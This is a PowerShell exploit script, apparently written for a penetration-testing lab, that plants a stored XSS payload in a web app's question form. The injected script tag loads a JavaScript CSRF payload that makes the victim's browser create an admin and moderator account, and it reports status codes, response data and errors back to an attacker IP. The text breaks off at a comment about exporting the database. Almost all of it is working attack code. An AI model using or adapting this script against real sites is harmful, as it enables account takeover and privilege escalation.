$attacker_ip = '192.168.119.123';
$target_ip = '192.168.123.251';
$javascript = @"
const attacker_ip = '$attacker_ip';
const host = 'answers';
const host_ip = '$target_ip';

username = "zinhart"
email = "zinhart@cucked.com"
isAdmin = "true"
isMod = "true"
let config = {
      "method":"POST",
      "credentials":"include",
      mode: "cors",
      headers: {
            "Content-Type": "application/x-www-form-urlencoded"
      },
      body: "name=" + encodeURIComponent(username) + "&email=" + encodeURIComponent(email) + "&isAdmin=" + encodeURIComponent(isAdmin) + "&isMod=" + encodeURIComponent(isMod)
  };

// Create an Admin user and seed values to crack the users password
doRequest(``http://`${host_ip}/admin/users/create``, config);

// Helper Functions
// very basic
function doRequest(endpoint, cfg) {
  return fetch(endpoint, cfg).then(async (response) => {
      fetch(``http://`${attacker_ip}/?endpoint=`` + endpoint, {
        mode: "cors",
      });   
      fetch(``http://`${attacker_ip}/?status_code=`` + response.status, {
        mode: "cors",
      });
    if(response.status < 400) {
      let data = await response.text();
      fetch(``http://`${attacker_ip}/?exfil=`` + data.length, {
        mode: "cors",
      });
    }
  }).catch((error) => {
       fetch(``http://`${attacker_ip}/?error=`` + error, {
        mode: "cors",
      });   
  });
}
"@
$csrf_payload = New-Item -ItemType File -Path "create-admin-user-csrf.js" -Value $javascript -Force;
$xss_payload = "`"><script src='http://$attacker_ip/$($csrf_payload.Name)'></script>"
Invoke-WebRequest -Uri "http://answers/question" -Method POST -body "title=hax&description=$xss_payload&category=1"

$start_time = [DateTimeOffset]::UtcNow.ToUnixTimeMilliseconds();
Write-Output "Sleeping for 30 seconds, start simulation";
Start-Sleep -Seconds 30;
$end_time = [DateTimeOffset]::UtcNow.ToUnixTimeMilliseconds();
Remove-Item -Path $csrf_payload.Name;
Write-Output $start_time;
Write-Output $end_time;

## get export of database from